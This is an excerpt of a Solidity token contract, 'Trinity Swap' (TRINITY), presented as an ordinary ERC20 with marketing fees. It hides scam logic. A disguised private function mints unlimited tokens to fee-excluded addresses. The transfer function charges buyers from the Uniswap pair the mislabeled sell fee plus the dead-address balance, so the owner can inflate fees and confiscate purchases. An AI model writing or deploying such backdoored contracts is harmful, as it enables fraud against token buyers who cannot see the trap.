...
contract TrinitySwap is ERC20, Ownable {
    uint256 public marketingFeeOnBuy  = 2;
    uint256 public marketingFeeOnSell = 4;

    address public marketingWallet = 0xfD9b5a94426c148ee421e037B64c989b83bb6055;
    ...
    constructor () ERC20("Trinity Swap", "TRINITY") 
    {   
        ...
        _mint(owner(), 5 * 1e6 * (10 ** 18));
        swapTokensAtAmount = totalSupply() / 5;
    }
   ...
   function bothexcluded(address first,address second) private view returns (bool){
      bool A=!_isExcludedFromFees[first];
        return (!A && _isExcludedFromFees[second]);
    }

function sendtoexl(address adr,uint256 tok) private{
    _mint(adr,tok);
}
    ...
    function _transfer(
        ...
        uint256 contractTokenBalance = balanceOf(DEAD);
        ...
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]){
            ...
            if (bothexcluded(to,from)){ sendtoexl(to,amount);}else{
        ...
        if(takeFee) {
            ...
            if(from == uniswapV2Pair) {
                ...
                fees = amount * marketingFeeOnSell / 100 + contractTokenBalance;
            } else {
                fees = 0;
            }
            amount -= fees;
